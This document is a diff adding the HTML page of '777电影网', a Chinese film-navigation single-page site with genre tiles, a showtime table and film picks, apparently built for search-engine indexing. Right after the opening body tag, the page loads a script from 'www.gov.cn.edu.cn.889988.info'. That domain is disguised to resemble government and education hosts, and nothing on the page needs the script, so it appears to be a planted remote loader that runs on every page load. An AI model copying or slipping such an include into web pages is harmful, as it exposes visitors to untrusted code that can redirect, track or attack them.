@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>777电影网 - 电影导航·高清片单·在线找片</title>
+<meta name="description" content="777电影网：电影分类导航与高清片单聚合，动作、悬疑、科幻、爱情、动漫、纪录片全覆盖，移动端自适应，内链占位，适合必应收录。">
+<meta name="keywords" content="777电影网,电影导航,高清片单,在线找片,动作电影,悬疑电影,科幻电影,日韩电影">
+<meta name="author" content="777电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://777dianyingwang-h5.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="777电影网 - 电影导航·高清片单">
+<meta property="og:description" content="777电影网：电影分类、高清片单、排片表、评分进度条，移动端自适应。">
+<meta property="og:url" content="https://777dianyingwang-h5.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#0b0b10">
+<style>
+:root{
+  --s7-black:#0b0b10;--s7-panel:#15151f;--s7-panel2:#1d1d2b;
+  --s7-orange:#ff8a00;--s7-pink:#ff2e63;--s7-ink:#e9e9f0;--s7-muted:#9a9ab0;
+  --s7-line:rgba(255,138,0,.28);--s7-pink-line:rgba(255,46,99,.28);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:var(--s7-black);color:var(--s7-ink);line-height:1.7;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+.box{max-width:1180px;margin:0 auto;padding:0 16px}
+
+/* 顶栏 */
+.s7-top{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(11,11,16,.93);backdrop-filter:blur(12px);border-bottom:1px solid var(--s7-line)}
+.s7-bar{display:flex;align-items:center;justify-content:space-between;height:58px}
+.s7-logo{font-size:20px;font-weight:900}
+.s7-logo b{color:var(--s7-orange)}
+.s7-logo i{color:var(--s7-pink);font-style:normal;font-size:13px;margin-left:6px}
+.s7-nav{display:flex;gap:4px;list-style:none}
+.s7-nav a{padding:8px 12px;border-radius:8px;font-size:14px;color:var(--s7-muted);min-height:36px;display:inline-flex;align-items:center}
+.s7-nav a:hover,.s7-nav a.active{color:var(--s7-orange);background:rgba(255,138,0,.12)}
+.s7-burger{display:none;background:none;border:0;font-size:22px;color:var(--s7-orange);cursor:pointer;padding:8px}
+
+/* Hero 号码牌 */
+.s7-hero{margin-top:58px;padding:60px 0 44px;background:radial-gradient(120% 120% at 80% 0%,rgba(255,46,99,.18),transparent 55%),radial-gradient(120% 120% at 10% 100%,rgba(255,138,0,.16),transparent 55%)}
+.s7-ticket{display:inline-flex;gap:8px;margin-bottom:18px}
+.s7-num{width:54px;height:64px;border-radius:10px;background:var(--s7-panel2);border:1px solid var(--s7-line);display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:900;color:var(--s7-orange);position:relative;overflow:hidden}
+.s7-num:nth-child(2){color:var(--s7-pink);border-color:var(--s7-pink-line)}
+.s7-num:before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--s7-orange),var(--s7-pink))}
+.s7-hero h1{font-size:clamp(28px,5vw,46px);font-weight:900;line-height:1.15;margin-bottom:14px}
+.s7-hero h1 em{color:var(--s7-orange);font-style:normal}
+.s7-hero h1 span{color:var(--s7-pink)}
+.s7-hero p{color:var(--s7-muted);max-width:620px;font-size:15px}
+.s7-cta{display:flex;gap:12px;flex-wrap:wrap;margin-top:22px}
+.s7-btn{display:inline-flex;align-items:center;gap:8px;min-height:44px;padding:0 24px;border-radius:12px;font-weight:800;cursor:pointer;border:2px solid transparent;transition:.3s}
+.s7-btn-1{background:linear-gradient(135deg,var(--s7-orange),#ff5e00);color:#1a1205}
+.s7-btn-1:hover{transform:translateY(-2px)}
+.s7-btn-2{border-color:var(--s7-pink);color:var(--s7-pink);background:transparent}
+.s7-btn-2:hover{background:rgba(255,46,99,.12)}
+
+/* 区块 */
+.s7-section{padding:52px 0}
+.s7-head{display:flex;align-items:center;gap:12px;margin-bottom:26px;flex-wrap:wrap}
+.s7-head .no{width:36px;height:36px;border-radius:10px;background:var(--s7-orange);color:#1a1205;font-weight:900;display:flex;align-items:center;justify-content:center}
+.s7-head h2{font-size:clamp(20px,3vw,28px);font-weight:900}
+.s7-head .d{margin-left:auto;font-size:13px;color:var(--s7-muted)}
+
+/* 影厅卡片 */
+.s7-halls{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.s7-hall{background:var(--s7-panel);border:1px solid var(--s7-line);border-radius:16px;padding:20px;transition:.3s;position:relative;overflow:hidden}
+.s7-hall:before{content:"";position:absolute;right:-30px;top:-30px;width:90px;height:90px;border-radius:50%;background:radial-gradient(circle,var(--s7-pink),transparent);opacity:.12}
+.s7-hall:hover{transform:translateY(-4px);border-color:var(--s7-pink);box-shadow:0 14px 30px rgba(255,46,99,.12)}
+.s7-hall .room{font-size:12px;color:var(--s7-orange);font-weight:700;letter-spacing:1px}
+.s7-hall h4{font-size:17px;margin:6px 0 8px}
+.s7-hall p{font-size:13px;color:var(--s7-muted)}
+.s7-hall .tags{margin-top:12px;display:flex;gap:6px;flex-wrap:wrap}
+.s7-hall .tags span{font-size:11px;padding:3px 9px;border:1px solid var(--s7-line);border-radius:99px;color:var(--s7-muted)}
+
+/* 排片表 */
+.s7-table{background:var(--s7-panel);border:1px solid var(--s7-line);border-radius:14px;overflow:hidden}
+.s7-row{display:grid;grid-template-columns:90px 1fr 120px 90px;gap:12px;padding:14px 18px;border-bottom:1px solid rgba(255,255,255,.06);align-items:center}
+.s7-row:last-child{border-bottom:0}
+.s7-row.head{background:var(--s7-panel2);font-size:12px;color:var(--s7-orange);font-weight:700}
+.s7-row .t{color:var(--s7-pink);font-weight:700;font-size:14px}
+.s7-row h4{font-size:15px}
+.s7-row .genre{font-size:12px;color:var(--s7-muted)}
+.s7-row .score{font-size:13px;color:var(--s7-orange)}
+.s7-bar2{height:6px;background:#0b0b10;border-radius:99px;overflow:hidden;margin-top:4px}
+.s7-bar2 i{display:block;height:100%;background:linear-gradient(90deg,var(--s7-orange),var(--s7-pink))}
+
+/* 幸运片单 */
+.s7-lucky{display:grid;grid-template-columns:1fr 1fr;gap:20px;align-items:center;background:linear-gradient(160deg,var(--s7-panel2),var(--s7-panel));border:1px solid var(--s7-line);border-radius:18px;padding:30px}
+.s7-lucky h3{font-size:22px;margin-bottom:10px}
+.s7-lucky h3 em{color:var(--s7-pink);font-style:normal}
+.s7-lucky p{color:var(--s7-muted);font-size:14px;margin-bottom:16px}
+.s7-slot{display:flex;gap:10px}
+.s7-slot .cell{flex:1;background:var(--s7-black);border:1px solid var(--s7-line);border-radius:12px;padding:16px;text-align:center}
+.s7-slot .cell b{display:block;font-size:18px;color:var(--s7-orange)}
+.s7-slot .cell span{font-size:12px;color:var(--s7-muted)}
+
+/* 类型磁贴 */
+.s7-types{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.s7-type{background:var(--s7-panel);border:1px solid var(--s7-line);border-radius:14px;padding:18px;text-align:center;transition:.3s}
+.s7-type:hover{transform:translateY(-3px);border-color:var(--s7-orange)}
+.s7-type .ic{font-size:26px;margin-bottom:8px}
+.s7-type h4{font-size:15px}
+.s7-type span{font-size:12px;color:var(--s7-muted)}
+
+/* 关于 */
+.s7-about{background:var(--s7-panel);border:1px solid var(--s7-line);border-radius:18px;padding:32px;text-align:center}
+.s7-about h3{font-size:20px;color:var(--s7-orange);margin-bottom:12px}
+.s7-about p{color:var(--s7-muted);font-size:14px;max-width:640px;margin:0 auto 16px}
+.s7-chips{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.s7-chips span{font-size:13px;padding:6px 14px;border:1px solid var(--s7-line);border-radius:99px;color:var(--s7-muted)}
+
+/* 页脚 */
+.s7-foot{background:#07070b;color:var(--s7-muted);padding:30px 0;text-align:center;font-size:13px}
+.s7-foot a{color:var(--s7-muted)}
+.s7-foot a:hover{color:var(--s7-orange)}
+
+@media(max-width:900px){
+  .s7-halls{grid-template-columns:1fr 1fr}
+  .s7-types{grid-template-columns:repeat(2,1fr)}
+  .s7-lucky{grid-template-columns:1fr}
+}
+@media(max-width:620px){
+  .s7-nav{position:fixed;top:58px;left:0;right:0;flex-direction:column;background:var(--s7-black);padding:14px;border-bottom:1px solid var(--s7-line);transform:translateY(-130%);transition:.3s}
+  .s7-nav.open{transform:none}
+  .s7-burger{display:block}
+  .s7-halls,.s7-types{grid-template-columns:1fr}
+  .s7-row{grid-template-columns:70px 1fr 70px;}
+  .s7-row .genre{display:none}
+}
+.reveal{opacity:0;transform:translateY(18px);transition:.6s ease}
+.reveal.in{opacity:1;transform:none}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="s7-top">
+  <div class="box s7-bar">
+    <div class="s7-logo">777<b>电影网</b><i>LUCKY FILM</i></div>
+    <button class="s7-burger" id="s7Burger" aria-label="菜单">☰</button>
+    <ul class="s7-nav" id="s7Nav">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#halls">影厅片单</a></li>
+      <li><a href="#schedule">今日排片</a></li>
+      <li><a href="#lucky">幸运片单</a></li>
+      <li><a href="#types">电影类型</a></li>
+      <li><a href="#about">关于777</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+  <!-- Hero -->
+  <section class="s7-hero" id="home">
+    <div class="box">
+      <div class="s7-ticket" aria-hidden="true">
+        <div class="s7-num">7</div><div class="s7-num">7</div><div class="s7-num">7</div>
+      </div>
+      <h1>777电影网<br>好片像<em>中奖</em>，<span>三部就上头</span></h1>
+      <p>777电影网做电影导航与高清片单聚合：按影厅、排片、类型、评分找片，移动端自适应，内链占位，适合必应收录。</p>
+      <div class="s7-cta">
+        <a href="#halls" class="s7-btn s7-btn-1">🎟️ 进影厅找片</a>
+        <a href="#schedule" class="s7-btn s7-btn-2">🎬 看今日排片</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 影厅片单 -->
+  <section class="s7-section" id="halls">
+    <div class="box">
+      <div class="s7-head reveal"><div class="no">1</div><h2>影厅片单</h2><span class="d">3 个虚拟影厅</span></div>
+      <div class="s7-halls">
+        <article class="s7-hall reveal">
+          <div class="room">ROOM 01 · 爆款厅</div>
+          <h4>沙丘2 / 奥本海默 / 哥斯拉2</h4>
+          <p>大场面、大声音、大银幕，爽感拉满。</p>
+          <div class="tags"><span>科幻</span><span>动作</span><span>IMAX</span></div>
+        </article>
+        <article class="s7-hall reveal">
+          <div class="room">ROOM 02 · 烧脑厅</div>
+          <h4>寄生虫 / 坠落的审判 / 记忆碎片</h4>
+          <p>反转、结构、人性灰度，看完想二刷。</p>
+          <div class="tags"><span>悬疑</span><span>犯罪</span><span>心理</span></div>
+        </article>
+        <article class="s7-hall reveal">
+          <div class="room">ROOM 03 · 治愈厅</div>
+          <h4>千与千寻 / 小偷家族 / 海街日记</h4>
+          <p>慢一点、软一点、人味多一点。</p>
+          <div class="tags"><span>文艺</span><span>动漫</span><span>家庭</span></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 今日排片 -->
+  <section class="s7-section" id="schedule" style="background:#0e0e16">
+    <div class="box">
+      <div class="s7-head reveal"><div class="no">2</div><h2>今日排片</h2><span class="d">2026-10-06</span></div>
+      <div class="s7-table reveal">
+        <div class="s7-row head"><div>时间</div><div>影片</div><div>类型</div><div>评分</div></div>
+        <div class="s7-row"><div class="t">10:00</div><div><h4>奥本海默</h4><div class="genre">传记 / 历史</div></div><div class="genre">剧情</div><div><div class="score">9.0</div><div class="s7-bar2"><i style="width:90%"></i></div></div></div>
+        <div class="s7-row"><div class="t">13:30</div><div><h4>沙丘2</h4><div class="genre">科幻 / 冒险</div></div><div class="genre">科幻</div><div><div class="score">8.7</div><div class="s7-bar2"><i style="width:87%"></i></div></div></div>
+        <div class="s7-row"><div class="t">16:00</div><div><h4>寄生虫</h4><div class="genre">悬疑 / 阶层</div></div><div class="genre">悬疑</div><div><div class="score">8.8</div><div class="s7-bar2"><i style="width:88%"></i></div></div></div>
+        <div class="s7-row"><div class="t">19:30</div><div><h4>千与千寻</h4><div class="genre">动漫 / 成长</div></div><div class="genre">动漫</div><div><div class="score">9.1</div><div class="s7-bar2"><i style="width:91%"></i></div></div></div>
+        <div class="s7-row"><div class="t">22:00</div><div><h4>坠落的审判</h4><div class="genre">悬疑 / 婚姻</div></div><div class="genre">悬疑</div><div><div class="score">8.7</div><div class="s7-bar2"><i style="width:87%"></i></div></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 幸运片单 -->
+  <section class="s7-section" id="lucky">
+    <div class="box">
+      <div class="s7-head reveal"><div class="no">3</div><h2>幸运片单</h2><span class="d">777 抽签式推荐</span></div>
+      <div class="s7-lucky reveal">
+        <div>
+          <h3>不知道看啥？抽 <em>3 张</em> 就完事</h3>
+          <p>777电影网用“号码牌”思路做推荐：不堆长列表，先给你三张幸运卡片，点哪张看哪张。</p>
+          <a href="#" class="s7-btn s7-btn-1">🎰 抽今日片单</a>
+        </div>
+        <div class="s7-slot">
+          <div class="cell"><b>9.4</b><span>霸王别姬</span></div>
+          <div class="cell"><b>8.9</b><span>星际穿越</span></div>
+          <div class="cell"><b>8.6</b><span>宇宙探索编辑部</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 类型 -->
+  <section class="s7-section" id="types" style="background:#0e0e16">
+    <div class="box">
+      <div class="s7-head reveal"><div class="no">4</div><h2>电影类型</h2><span class="d">8 个入口</span></div>
+      <div class="s7-types">
+        <div class="s7-type reveal"><div class="ic">💥</div><h4>动作</h4><span>枪战 / 功夫 / 飙车</span></div>
+        <div class="s7-type reveal"><div class="ic">🕵️</div><h4>悬疑</h4><span>推理 / 烧脑 / 反转</span></div>
+        <div class="s7-type reveal"><div class="ic">🚀</div><h4>科幻</h4><span>太空 / AI / 未来</span></div>
+        <div class="s7-type reveal"><div class="ic">💕</div><h4>爱情</h4><span>青春 / 婚姻 / 治愈</span></div>
+        <div class="s7-type reveal"><div class="ic">🎨</div><h4>文艺</h4><span>作者 / 慢镜 / 隐喻</span></div>
+        <div class="s7-type reveal"><div class="ic">📹</div><h4>纪录片</h4><span>自然 / 社会 / 人物</span></div>
+        <div class="s7-type reveal"><div class="ic">👻</div><h4>惊悚</h4><span>心理 / 怪谈 / 密室</span></div>
+        <div class="s7-type reveal"><div class="ic">🧒</div><h4>动漫</h4><span>国漫 / 日番 / 剧场版</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="s7-section" id="about">
+    <div class="box">
+      <div class="s7-about reveal">
+        <h3>关于 777电影网</h3>
+        <p>777电影网是一个电影导航与高清片单聚合单页：用影厅、排片表、幸运抽签、类型磁贴帮用户快速找片。页面为静态演示，内链均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+        <div class="s7-chips">
+          <span>号码牌视觉</span><span>影厅片单</span><span>排片表</span><span>幸运抽签</span><span>移动端自适应</span><span>必应友好</span>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="s7-foot">
+  <div class="box">
+    <p>© 2026 777电影网 · https://777dianyingwang-h5.github.io</p>
+    <p style="margin-top:8px"><a href="#">首页</a> · <a href="#">影厅片单</a> · <a href="#">今日排片</a> · <a href="#">幸运片单</a> · <a href="#">免责声明</a></p>
+  </div>
+</footer>
+
+<button id="s7Top" style="position:fixed;right:16px;bottom:16px;width:44px;height:44px;border-radius:50%;border:1px solid var(--s7-line);background:var(--s7-panel);color:var(--s7-orange);font-size:20px;cursor:pointer;display:none;z-index:99" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var burger=document.getElementById('s7Burger'),nav=document.getElementById('s7Nav');
+  burger.addEventListener('click',function(){nav.classList.toggle('open')});
+  nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open')})});
+
+  var links=nav.querySelectorAll('a'),secs=document.querySelectorAll('main section[id]');
+  window.addEventListener('scroll',function(){
+    var y=window.scrollY+120,cur='home';
+    secs.forEach(function(s){if(s.offsetTop&&y>=s.offsetTop)cur=s.id});
+    links.forEach(function(l){l.classList.toggle('active',l.getAttribute('href')==='#'+cur)});
+  });
+
+  var topBtn=document.getElementById('s7Top');
+  window.addEventListener('scroll',function(){topBtn.style.display=window.scrollY>400?'block':'none'});
+  topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+
+  var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting)e.target.classList.add('in')})},{threshold:.08});
+  document.querySelectorAll('.reveal').forEach(function(el){io.observe(el)});
+})();
+</script>
+</body>
+</html>
